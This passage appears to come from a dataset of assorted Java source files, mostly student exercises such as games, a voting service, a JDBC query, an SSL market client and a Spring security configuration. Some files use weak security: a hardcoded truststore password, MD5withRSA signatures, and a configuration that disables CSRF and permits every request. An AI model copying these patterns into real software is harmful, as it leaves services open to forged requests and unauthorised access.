p2.y);\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        JFrame frame = new JFrame(\"3D Game Engine\");\r\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n        frame.setResizable(false);\r\n        frame.add(new GameEngine3D(), BorderLayout.CENTER);\r\n        frame.pack();\r\n        frame.setLocationRelativeTo(null);\r\n        frame.setVisible(true);\r\n    }\r\n}\r\n",
    "import java.util.Random;\r\nimport java.util.Scanner;\r\n\r\npublic class task_1 {\r\n    public static void main(String[] args) \r\n    {\r\n        Scanner scanner = new Scanner(System.in);\r\n        Random random = new Random();\r\n\r\n        int rannum = random.nextInt(10) + 1;\r\n        int amp = 0;\r\n        boolean hasGuessed = false;\r\n\r\n        System.out.println(\"Welcome to Guess the Number game!\");\r\n\r\n        System.out.println(\"Enter a number to Guess b/w 1--10 :\");\r\n\r\n        while (!hasGuessed)\r\n        {\r\n            System.out.print(\"Enter your guess: \");\r\n            int guess = scanner.nextInt();\r\n            amp++;\r\n\r\n            if (guess == rannum)\r\n             {\r\n                hasGuessed = true;\r\n                System.out.println(\"Congratulations! You've guessed the number \" + rannum + \" correctly!\");\r\n                System.out.println(\"Number of attempts Taken : \" + amp);\r\n            } \r\n            else if (guess < rannum)\r\n             {\r\n                System.out.println(\"Too low! Try again.\");\r\n            } \r\n            else \r\n            {\r\n                System.out.println(\"Too high! Try again.\");\r\n            }\r\n        }\r\n\r\n        scanner.close();\r\n    }\r\n}\r\n",
    "package com.example.demo.service;\r\n\r\nimport com.example.demo.publcInterfaces.EVMCommon;\r\nimport org.springframework.beans.factory.annotation.Autowired;\r\nimport org.springframework.stereotype.Service;\r\n\r\nimport java.util.*;\r\n\r\n@Service\r\npublic class EVMService implements EVMCommon\r\n{\r\n\r\n    public int ctr;\r\n    EVMService()\r\n    {\r\n        ctr=0;\r\n    }\r\n    public Map<String, Integer> getParticipanmts() {\r\n        return participanmts;\r\n    }\r\n\r\n\r\n    private Map<String,Integer> participanmts=new HashMap<>();\r\n\r\n    public List<Integer> getLiveList() {\r\n        return LiveList;\r\n    }\r\n\r\n    private List<Integer> LiveList=new ArrayList<>();\r\n\r\n\r\n\r\n    @Override\r\n    public String addParticipant(String partyName) {\r\n        String s;\r\n        if(!participanmts.containsKey(partyName))\r\n        {\r\n            participanmts.put(partyName,0);\r\n\r\n            s=\"Added\";\r\n        }\r\n        else {\r\n            s=\"Already there !!! Hold On Baby!!\";\r\n        }\r\n\r\n        return s;\r\n    }\r\n    public Map<String,Integer > allParticipant() {\r\n        return participanmts;\r\n\r\n    }\r\n    @Override\r\n    public int noOfVotes()\r\n    {\r\n        return ctr;\r\n    }\r\n\r\n    @Override\r\n    public String removeParticipants(String partyName) {\r\n        String s;\r\n        if(participanmts.containsKey(partyName))\r\n        {\r\n           participanmts.remove(partyName);\r\n           s=\"removed\";\r\n        }else\r\n        {\r\n            s=\"Not There !! Check your data\";\r\n        }\r\n        return s;\r\n\r\n    }\r\n\r\n    @Override\r\n    public int UpdateEVM(String partyName) {\r\n        int n=0;\r\n        if(participanmts.containsKey(partyName))\r\n        {\r\n            ctr++;\r\n            participanmts.put(partyName, participanmts.get(partyName)+1);\r\n\r\n            int index = -1;\r\n            int currentIndex = 0;\r\n\r\n            for (Map.Entry<String, Integer> entry : participanmts.entrySet()) {\r\n                if (entry.getKey().equals(partyName) ){\r\n                    index = currentIndex;\r\n                    break;\r\n                }\r\n                currentIndex++;\r\n            }\r\n            LiveList.add(index);\r\n            n=1;\r\n        }\r\n        else {\r\n            n=-1;\r\n        }\r\n        return n;\r\n    }\r\n\r\n\r\n    @Override\r\n    public String toString() {\r\n        return \"EVMService{\" +\r\n                \"participanmts=\" + participanmts +\r\n                '}';\r\n    }\r\n}\r\n",
    "import java.util.ArrayList;\n\npublic class ServiceObject implements ServiceInterface\n{\n  public ArrayList<Integer> getAuthorizedIds()\n  {\n    ArrayList<Integer> authorizedIds = new ArrayList<>();\n\n    //Fetch authorized ID's\n    //DUMMY DATA: Only clientId's that are prime numbers between 7 and 23 can be authorized:\n    authorizedIds.add(7);\n    authorizedIds.add(11);\n    authorizedIds.add(13);\n    authorizedIds.add(17);\n    authorizedIds.add(19);\n    authorizedIds.add(23);\n    authorizedIds.add(29);\n    /* TODO: SHOULD FETCH FROM A SERVER OR DATABASE HERE! */\n\n    return authorizedIds;\n  }\n\n  public ArrayList<String> getAuthorizedCountries()\n  {\n    ArrayList<String> authorizedCountries = new ArrayList<>();\n\n    //Fetch the authorized countries:\n    //DUMMY DATA: Only clients from Denmark have access to the citizenship information:\n    authorizedCountries.add(\"Denmark\");\n    authorizedCountries.add(\"DK\");\n    authorizedCountries.add(\"DNK\");\n\n    /* TODO: SHOULD FETCH FROM A SERVER OR DATABASE HERE! */\n\n    return authorizedCountries;\n  }\n\n\n\n  @Override public ArrayList<ArrayList<String>> getCitizenshipData(Client client)\n  {\n    //Query another source for the citizenship data.\n    //Perform a heavy cost task\n    int counter = 0;\n\n    //Build the citizenship data to send\n    ArrayList<ArrayList<String>> citizenshipData = new ArrayList<>();\n\n    //Dummy Data: Possible citizenshipStatus:\n    ArrayList<String> possibleCitizenshipStatus = new ArrayList<>();\n    possibleCitizenshipStatus.add(\"Citizen\");\n    possibleCitizenshipStatus.add(\"Asylum Seeker\");\n    possibleCitizenshipStatus.add(\"Temporary Refugee\");\n    possibleCitizenshipStatus.add(\"Legal Resident\");\n\n    //Dummy Data: Possible criminal status:\n    ArrayList<String> possibleCriminalStatus = new ArrayList<>();\n    possibleCriminalStatus.add(\"No Criminal History\");\n    possibleCriminalStatus.add(\"Minor Traffic violations\");\n    possibleCriminalStatus.add(\"Major Traffic violations\");\n    possibleCriminalStatus.add(\"Criminal Fraud\");\n    possibleCriminalStatus.add(\"Involuntary Man-slaughter\");\n    possibleCriminalStatus.add(\"Man-slaughter\");\n    possibleCriminalStatus.add(\"Mass Murder\");\n    possibleCriminalStatus.add(\"Terrorism\");\n\n    while(counter <= 1000000)\n    {\n      ArrayList<String> specificCitizenData = new ArrayList<>();\n\n      //1st Query citizen name:\n      if(counter < 10)\n      {\n        specificCitizenData.add(\"Citizen #000000\" + counter);\n      }\n      if(counter < 100 && counter >= 10)\n      {\n        specificCitizenData.add(\"Citizen #00000\" + counter);\n      }\n      if(counter < 1000 && counter >= 100)\n      {\n        specificCitizenData.add(\"Citizen #0000\" + counter);\n      }\n      if(counter < 10000 && counter >= 1000)\n      {\n        specificCitizenData.add(\"Citizen #000\" + counter);\n      }\n      if(counter < 100000 && counter >= 10000)\n      {\n        specificCitizenData.add(\"Citizen #00\" + counter);\n      }\n      if(counter < 1000000 && counter >= 100000)\n      {\n        specificCitizenData.add(\"Citizen #0\" + counter);\n      }\n      if(counter >= 1000000)\n      {\n        specificCitizenData.add(\"Citizen #\" + counter);\n      }\n\n      //2nd Query citizenshipStatus:\n      if(counter%2 == 0)\n      {\n        //Ensure 50% of population are full citizens.\n        specificCitizenData.add(possibleCitizenshipStatus.get(0));\n      }\n      if(counter%2 != 0)\n      {\n        //Assign a mixture of citizenship status' to the remaining 50% of the population.\n        specificCitizenData.add(possibleCitizenshipStatus.get(((int) (Math.random()*100))%3));\n      }\n\n\n      //3rd Query Criminal Status:\n      ArrayList<String> possibleTimeSentences = new ArrayList<>();\n      for (int i = 0; i < 50; i++)\n      {\n        if(i == 0)\n        {\n          possibleTimeSentences.add(\"Punished with a fine.\");\n        }\n        else\n        {\n          possibleTimeSentences.add(\"Punished with \" + i + \" years in jail.\");\n        }\n      }\n\n      if(counter%2 == 0)\n      {\n        //Ensure 50% of population are full citizens.\n        specificCitizenData.add(possibleCriminalStatus.get(0));\n      }\n      if(counter%2 != 0)\n      {\n        //Assign a mixture of citizenship status' to the remaining 50% of the population.\n        specificCitizenData.add(possibleCriminalStatus.get(((int) (Math.random()*100))%7));\n        if(specificCitizenData.get(2).equalsIgnoreCase(\"No Criminal History\") || specificCitizenData.get(2).equalsIgnoreCase(\"Minor Traffic violations\"))\n        {\n          specificCitizenData.add(possibleTimeSentences.get((1 + (int) (Math.random()*100))%50));\n        }\n      }\n\n      //Assign this citizen to the citizenshipData:\n      citizenshipData.add(specificCitizenData);\n      counter++;\n    }\n    return citizenshipData;\n  }\n}\n",
    "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Frog frog = frogByUser();\n        Point[] route = route();\n        aliveOrNot(frog,route);\n    }\n\n    public static Frog frogByUser(){\n        System.out.print(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u043b\u044f\u0433\u0443\u0448\u043a\u0438 \u0438 \u0434\u043b\u0438\u043d\u0443 \u044f\u0437\u044b\u043a\u0430: \");\n        Scanner read = new Scanner(System.in);\n        int x, y, l;\n        x=read.nextInt();\n        y=read.nextInt();\n        Point point = new Point(x,y);\n        l=read.nextInt();\n        return new Frog(point,l);\n    }\n    public static Point[] route(){\n        System.out.print(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u043b\u0438\u043d\u0443 \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430: \");\n        Scanner read = new Scanner(System.in);\n        int l;\n        l=read.nextInt();\n        Point[] route = new Point[l];\n        for (int i = 0; i<l; i++)\n        {\n            System.out.print(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u0442\u043e\u0447\u043a\u0438: \");\n            route[i] = new Point(read.nextInt(), read.nextInt());\n        }\n        return route;\n    }\n    public static void aliveOrNot(Frog frog, Point[] route){\n        boolean j = true;\n        for (int i = 0; i<route.length; i++){\n            if (Point.calcDistance(route[i],frog.place)<= frog.tongueLength){\n                System.out.println(\"\u0421\u044a\u0435\u043b\u0438 \u0432 \u0442\u043e\u0447\u043a\u0435 \"+(i+1));\n                j = false;\n                break;\n            }\n        }\n        if (j) System.out.println(\"YES\");\n    }\n    //TODO:\n    //1 \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u0444\u0443\u043d\u043a\u0446\u0438\u044e, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0441\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u0442 \u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u0438 \u0434\u043b\u0438\u043d\u0443 \u044f\u0437\u044b\u043a\u0430 \u0438 \u0432\u044b\u0434\u0430\u0435\u0442 \u0432\n    //  \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430 \u043d\u043e\u0432\u0443\u044e \u041b\u044f\u0433\u0443\u0448\u043a\u0443\n    //2 \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u0444\u0443\u043d\u043a\u0446\u0438\u044e, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0441\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u0442 \u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0434\u043b\u0438\u043d\u0443 \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430, \u0437\u0430\u0442\u0435\u043c \u0437\u0430\u043f\u0440\u0430\u0438\u0432\u0430\u0435\u0442\n    //  \u043c\u043d\u043e\u0433\u043e \u0442\u043e\u0447\u0435\u043a \u0432 \u0432\u0438\u0434\u0435 \u043f\u0430\u0440 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\n    //  \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u044d\u0442\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 - \u043c\u0430\u0441\u0441\u0438\u0432 \u0422\u043e\u0447\u0435\u043a\n    //3 \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u0444\u0443\u043d\u043a\u0446\u0438\u044e, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u0440\u0430\u0431\u043e\u0442\u0443 \u0432\u044b\u0448\u0435\u043e\u043f\u0438\u0441\u0430\u043d\u043d\u044b\u0445 \u0444\u0443\u043d\u043a\u0446\u0438\u0439\n    //  \u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u0442 \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0443 \u0432\u044b\u0436\u0438\u0432\u0430\u043d\u0438\u044f \u043a\u0443\u0437\u043d\u0435\u0447\u0438\u043a\u0430\n}\n\nclass Point{\n    int x,y;\n\n    public Point(int x, int y) {\n        this.x = x;\n        this.y = y;\n    }\n\n    public static double calcDistance(Point p1, Point p2){\n        return Math.sqrt((p1.x-p2.x)*(p1.x-p2.x)+(p1.y-p2.y)*(p1.y-p2.y));\n    }\n}\n\nclass Frog{\n    Point place;\n    int tongueLength;\n    public Frog() {\n        this.place = new Point(0,0);\n        this.tongueLength = 0;\n    }\n\n    public Frog(Point place, int tongueLength) {\n        this.place = place;\n        this.tongueLength = tongueLength;\n    }\n\n    public Frog(int x, int y, int len){\n        place = new Point(x, y);\n        tongueLength = len;\n    }\n\n}",
    "package com.example.tablayout;\n\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.viewpager.widget.PagerAdapter;\nimport androidx.viewpager.widget.ViewPager;\n\nimport android.location.SettingInjectorService;\nimport android.os.Bundle;\nimport android.view.MotionEvent;\nimport android.view.View;\nimport android.widget.TableLayout;\n\nimport com.google.android.material.tabs.TabItem;\nimport com.google.android.material.tabs.TabLayout;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private TabLayout tabLayout;\n    private TabItem tabItem_a, tabItem_b, tabItem_c, tabItem_d;\n    private ViewPager viewPager;\n\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        tabLayout=findViewById(R.id.tab_layout);\n        tabItem_a=findViewById(R.id.tb_a);\n        tabItem_b=findViewById(R.id.tb_b);\n        tabItem_c=findViewById(R.id.tb_c);\n        tabItem_d= findViewById(R.id.tb_d);\n\n        viewPager=findViewById(R.id.viewpager);\n\n        PageAdapter pageAdapter;\n        pageAdapter=new PageAdapter(getSupportFragmentManager(),tabLayout.getTabCount());\n        viewPager.setAdapter(pageAdapter);\n\n\n        tabLayout.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {\n\n\n            @Override\n            public void onTabSelected(TabLayout.Tab tab) {\n\n                viewPager.setCurrentItem(tab.getPosition());\n\n                if (tab.getPosition()==0 || tab.getPosition()==1|| tab.getPosition()==2)\n                    pageAdapter.notifyDataSetChanged();\n\n            }\n\n            @Override\n            public void onTabUnselected(TabLayout.Tab tab) {\n\n\n\n\n            }\n\n            @Override\n            public void onTabReselected(TabLayout.Tab tab) {\n\n\n            }\n        });\n\n        viewPager.addOnPageChangeListener(new TabLayout.TabLayoutOnPageChangeListener(tabLayout));\n\n    }\n\n}",
    "import java.sql.*;\n\npublic class MedicalRecords {\n    public static void main(String[] args) {\n        try {\n            String jdbcUrl = \"jdbc:oracle:thin:@localhost:1521:xe\";\n            String username = \"bhagiradhija\";\n            String password = \" \"; // Replace with your actual password\n\n            try (Connection connection = DriverManager.getConnection(jdbcUrl, username, password);\n                 Statement statement = connection.createStatement();\n                 ResultSet resultSet = statement.executeQuery(\"SELECT patient_id, name, problem, bill FROM patients\")) {\n\n                while (resultSet.next()) {\n                    int patientId = resultSet.getInt(\"patient_id\");\n                    String name = resultSet.getString(\"name\");\n                    String problem = resultSet.getString(\"problem\");\n                    double bill = resultSet.getDouble(\"bill\");\n\n                    System.out.println(\"Patient ID: \" + patientId);\n                    System.out.println(\"Name: \" + name);\n                    System.out.println(\"Problem: \" + problem);\n                    System.out.println(\"Bill: \" + bill);\n                    System.out.println(\"--------------------------------------\");\n                }\n            } catch (SQLException e) {\n                System.err.println(\"Error: \" + e.getMessage());\n            }\n        } catch (ClassNotFoundException e) {\n            System.err.println(\"Error: JDBC driver not found\");\n        }\n    }\n}\n",
    "\n\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.net.UnknownHostException;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.security.InvalidKeyException;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.SignatureException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Scanner;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.CipherInputStream;\nimport javax.crypto.CipherOutputStream;\nimport javax.net.SocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\n\n\npublic class Tintolmarket {\n    \n    private String IP = \"\"; //IP del host (la de nuestro PC en este caso)\n    private String Port = \"\"; //Puerto del servidor\n    private String password = \"\";\n    private String userID = \"\";\n    private String keystore_name = \"\";\n    private String truststore_name = \"\";\n    private PrivateKey privateKey;\n    private PublicKey publicKey;\n    private KeyStore keystore;\n    private String clients_folder = \"\";\n    private String client_folder = \"\";\n\n    \n    public static void main(String[] args) throws Exception {\n        Tintolmarket client = new Tintolmarket(args[0],args[1],args[2],args[3],args[4]);\n        client.startMarkket();\n    }\n\n    public Tintolmarket(String adress , String truststore , String keystore_name , String pswd , String userID) throws NoSuchAlgorithmException, CertificateException, IOException, KeyStoreException, UnrecoverableKeyException{\n       \n        if(adress.indexOf(\":\") != -1){\n            String [] aux = adress.split(\":\");\n            IP = aux[0];\n            Port = aux[1];\n        }\n        else{\n            IP = adress;\n            Port = \"12345\";\n        }\n\n        this.keystore_name = keystore_name;\n        this.password = pswd;\n        this.userID = userID;\n        this.truststore_name = truststore;\n\n        String ruta = \"./KSClients/\" + keystore_name;\n        FileInputStream kfile = new FileInputStream(ruta); //keystore\n        keystore = KeyStore.getInstance(\"PKCS12\");\n        keystore.load(kfile, password.toCharArray());\n        privateKey = (PrivateKey)keystore.getKey(userID, password.toCharArray());\n    }\n\n    public byte[] sign(long nonce) throws SignatureException, InvalidKeyException, NoSuchAlgorithmException{\n        Signature s = Signature.getInstance(\"MD5withRSA\");\n        s.initSign(privateKey);\n        byte[] buf = new byte[8];\n        for (int i = 0; i < 8; i++) {\n            buf[i] = (byte)(nonce >> (i * 8));\n        }\n        s.update(buf);\n\n        return s.sign();\n        \n    }\n    public void startMarkket() throws NumberFormatException, UnknownHostException, IOException, ClassNotFoundException, NoSuchAlgorithmException, CertificateException, KeyStoreException, InvalidKeyException, SignatureException{\n\n        //Creacion de la truststore para el cliente\n\n        /*\n         *Exportar el certificado autoasignado del servidor\n         *keytool -exportcert -alias server -file certServer.cer -keystore keystore.server\n         *Importarlo en la truststore\n         *keytool -importcert -alias trust -file certServer.cer -keystore truststore.client\n         */\n        //Definimos las propiedades antes de la creacion del SSLSocket\n        System.setProperty(\"javax.net.ssl.trustStore\", truststore_name);\n        System.setProperty(\"javax.net.ssl.trustStorePassword\", \"3432576\");\n        \n        SocketFactory sf = SSLSocketFactory.getDefault( );\n        SSLSocket s = (SSLSocket) sf.createSocket(IP, Integer.parseInt(Port));\n        \n        \n        try{\n          \n            ObjectOutputStream outStream = new ObjectOutputStream(s.getOutputStream());\n           \n            ObjectInputStream inStream = new ObjectInputStream(s.getInputStream());\n        \n            outStream.writeObject(userID);\n            \n            long nonce = (long)inStream.readObject();\n            boolean flag = (boolean)inStream.readObject();\n\n            byte[] sign = sign(nonce);\n\n            outStream.writeObject(sign);\n            \n            if(!flag){ //No esta registardo           \n                outStream.writeObject(nonce);\n                outStream.writeObject(keystore.getCertificate(userID));            \n            }\n\n\n        \n\n        File dir_actual = new File(\"\");\n        clients_folder = dir_actual.getAbsolutePath()  + \"/GalleryForAllClients/\";\n\n        File directorio = new File(clients_folder );\n        if (!directorio.exists",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage com.mycompany.data_strcutress_proje;\r\n\r\n/**\r\n *\r\n * @author HENDEMOGLU\r\n */\r\nimport java.util.Random;\r\n\r\npublic class EmreHendemo\u011fluTombalaCardCreator {\r\n     // Sabitlerin tan\u0131mlanmas\u0131\r\n    private static final int ROWS = 3;// Her kart i\u00e7in sat\u0131r say\u0131s\u0131.\r\n    private static final int COLS = 9;// Her kart i\u00e7in s\u00fctun say\u0131s\u0131.\r\n    private static final int NUMBERS_PER_ROW = 5;// Oyunda kullan\u0131lacak toplam say\u0131 adedi.\r\n    private static final Random random = new Random();// Rastgele say\u0131 \u00fcretici.\r\n\r\n    // Tombala kart\u0131 olu\u015fturmak i\u00e7in kullan\u0131lan metod.\r\n    public static String[][] generateTombalaCard() {\r\n        String[][] card = new String[ROWS][COLS];\r\n        // Her s\u00fctun i\u00e7in benzersiz ve s\u0131ral\u0131 say\u0131lar \u00fcretme.\r\n        for (int col = 0; col < COLS; col++) {\r\n            int start = col * 10 + 1; // S\u00fctun i\u00e7in ba\u015flang\u0131\u00e7 say\u0131s\u0131.\r\n            int[] colNumbers = new int[ROWS];\r\n            for (int i = 0; i < ROWS; i++) {\r\n                colNumbers[i] = creationNumber(start, start + 9, colNumbers);\r\n            }\r\n            // Say\u0131lar\u0131 kart\u0131n s\u00fctunlar\u0131na yerle\u015ftir\r\n            for (int row = 0; row < ROWS; row++) {\r\n                card[row][col] = Integer.toString(colNumbers[row]);\r\n            }\r\n        }\r\n\r\n        // Her sat\u0131ra 4 tane \"X\" i\u015fareti yerle\u015ftir\r\n        for (int row = 0; row < ROWS; row++) {\r\n            for (int xCount = 0, addedX = 0; addedX < 4; xCount++) {\r\n                int col = random.nextInt(COLS);\r\n                if (!\"X\".equals(card[row][col]) && xCount < COLS) {\r\n                    card[row][col] = \"X\";\r\n                    addedX++;\r\n                } else if (xCount >= COLS) {\r\n                    // T\u00fcm s\u00fctunlar denendi\u011finde ve yeterli X eklenemedi\u011finde durur.\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        return card;\r\n    }\r\n     // Belirli bir aral\u0131kta benzersiz say\u0131 \u00fcretmek i\u00e7in kullan\u0131lan yard\u0131mc\u0131 metod.\r\n    public static int creationNumber(int start, int end, int[] previousNumbers) {\r\n        int number;\r\n        do {\r\n            number = start + random.nextInt(end - start + 1);\r\n        } while (isNumberInArray(number, previousNumbers));\r\n        return number;\r\n    }\r\n    \r\n    // Bir say\u0131n\u0131n dizi i\u00e7inde olup olmad\u0131\u011f\u0131n\u0131 kontrol eden metod.\r\n    public static boolean isNumberInArray(int number, int[] array) {\r\n        for (int value : array) {\r\n            if (value == number) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // \u00c7ekilen say\u0131n\u0131n daha \u00f6nce \u00e7ekilip \u00e7ekilmedi\u011finin kontrol\u00fcn\u00fc sa\u011flayan metod\r\n    public static boolean drawnNumberControl(int[] drawnNumbers, int countDrawn, int number) {\r\n        for (int i = 0; i < countDrawn; i++) {\r\n            if (drawnNumbers[i] == number) {\r\n                return true; // Say\u0131 daha \u00f6nce \u00e7ekilmi\u015f ise.\r\n            }\r\n        }\r\n        return false; // Say\u0131 daha \u00f6nce \u00e7ekilmemi\u015f ise.\r\n    }\r\n\r\n}",
    "package com.accenture.security;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.config.Customizer;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\nimport org.springframework.security.crypto.factory.PasswordEncoderFactories;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.provisioning.JdbcUserDetailsManager;\nimport org.springframework.security.provisioning.UserDetailsManager;\nimport org.springframework.security.web.SecurityFilterChain;\n\nimport javax.sql.DataSource;\n\n@Configuration\n@Slf4j\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n\n        final String ADMIN = \"ADMIN\";\n        final String CLIENT = \"CLIENT\";\n\n        http\n                .csrf(AbstractHttpConfigurer::disable)\n                .httpBasic(Customizer.withDefaults())\n                .authorizeHttpRequests(authorize -> {\n                    authorize\n//                            .requestMatchers(HttpMethod.GET, \"/\").permitAll();\n                            .requestMatchers( \"/\").permitAll();\n//                            .requestMatchers(\"/clients/*\").hasAnyRole(ADMIN, CLIENT)\n//                            .requestMatchers(\"/clients\").hasAnyRole(ADMIN, CLIENT)\n//                            .requestMatchers(\"/locations\").hasAnyRole(ADMIN, CLIENT)\n//                            .requestMatchers(\"/locations/**\").hasRole(ADMIN)\n//                            .requestMatchers(\"/accessoires\").hasAnyRole(ADMIN, CLIENT)\n//                            .requestMatchers(\"/admins/*\").hasRole(ADMIN)\n//                            .requestMatchers(\"/admins\").hasRole(ADMIN)\n//                            .requestMatchers(\"/vehicules\").hasRole(ADMIN)\n//                            .requestMatchers(\"/vehicules/**\").hasRole(ADMIN)\n//                            .requestMatchers(\"/voitures\").hasRole(ADMIN)\n//                            .requestMatchers(\"/voitures/*\").hasRole(ADMIN)\n//                            .requestMatchers(\"/connexion/*\").permitAll()\n//                            .requestMatchers(\"/monCompte\").authenticated()\n//                            .requestMatchers(\"/monCompte/supprimer\").authenticated()\n//                            .requestMatchers(\"/swagger-ui/*\", \"/v3/api-docs/**\", \"/swagger-resources/**\", \"/webjars/**\").permitAll();\n\n                    authorize.requestMatchers(\"/public\").permitAll();\n//                    authorize.anyRequest().denyAll();\n                    authorize.anyRequest().permitAll();\n                });\n\n        return http.build();\n    }\n\n    @Bean\n    UserDetailsManager userDetailsManager(DataSource dataSource) {\n        JdbcUserDetailsManager userDetailsManager = new JdbcUserDetailsManager(dataSource);\n        userDetailsManager.setUsersByUsernameQuery(\"SELECT email, mot_de_passe, 1 FROM utilisateurs WHERE email = ?\");\n        userDetailsManager.setAuthoritiesByUsernameQuery(\"SELECT email, CONCAT('ROLE_',role) FROM utilisateurs WHERE email = ?\");\n\n        return userDetailsManager;\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return PasswordEncoderFactories.createDelegatingPasswordEncoder();\n    }\n}\n",
    "import java.util.Scanner;\n\npublic class DivisibilityChecker {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n\n        // Input the number\n        System.out.print(\"Enter a number: \");\n        int number = scanner.nextInt();\n\n        // Check if the number is divisible by both 7 and 13\n        boolean divisibleBy7And13 = (number % 7 == 0) && (number % 13 == 0);\n\n        if (divisibleBy7And13) {\n            int quotient7 = number / 7;\n            int remainder7 = number % 7;\n            int quotient13 = number / 13;\n            int remainder13 = number % 13;\n\n            System.out.println(number + \" is divisible by both 7 and 13.\");\n            System.out.println(\"Quotient when divided by 7: \" + quotient7);\n            System.out.println(\"Remainder when divided by 7: \" + remainder7);\n            System.out.println(\"Quotient when divided by 13: \" + quotient13);\n            System.out.println(\"Remainder when divided by 13: \" + remainder13);\n        } else {\n            System.out.println(number + \" is not divisible by both 7 and 13 simultaneously.\");\n        }\n\n        scanner.close();\n    }\n}\n",
    "import java.util.Scanner; \nimport java.util.HashSet; \nimport java.util.Set; \nimport java.util.ArrayList; \nimport java.util.List;\n\npublic class Token { \n    public static void main(String[] args) { \n        \n        Scanner s = new Scanner(System.in);\n\n    Set<String> reservedWords = new HashSet<>();\n    reservedWords.add(\"int\");\n    reservedWords.add(\"float\");\n    reservedWords.add(\"char\");\n    reservedWords.add(\"boolean\");\n    reservedWords.add(\"void\");\n    reservedWords.add(\"if\");\n    reservedWords.add(\"else\");\n    reservedWords.add(\"for\");\n    reservedWords.add(\"while\");\n    reservedWords.add(\"scanf\");\n    reservedWords.add(\"println\");\n    reservedWords.add(\"main\");\n    reservedWords.add(\"return\");\n\n    Set<String> operators = new HashSet<>();\n    operators.add(\"=\");\n    operators.add(\"+\");\n    operators.add(\"-\");\n    operators.add(\"*\");\n    operators.add(\"/\");\n    operators.add(\"%\");\n    operators.add(\"&&\");\n    operators.add(\"||\");\n    operators.add(\">\");\n    operators.add(\">=\");\n    operators.add(\"<\");\n    operators.add(\"<=\");\n    operators.add(\"!=\");\n    operators.add(\"==\");\n\n    boolean inString = false;\n    List<String> tokenList = new ArrayList<>();\n\n    while (true) {\n        System.out.println(\"\");\n        System.out.println(\"Digite algo:\");\n\n        if (s.hasNextLine()) {\n            String line = s.nextLine();\n\n            String[] tokens = line.split(\"\\\\s+\"); // divide a linha em tokens usando espa\u00e7os em branco como\n                                                  // Delimitador\n\n            for (String token : tokens) {\n                tokenList.add(token); // Adiciona o token \u00e0 lista de tokens\n\n                if (inString) {\n                    if 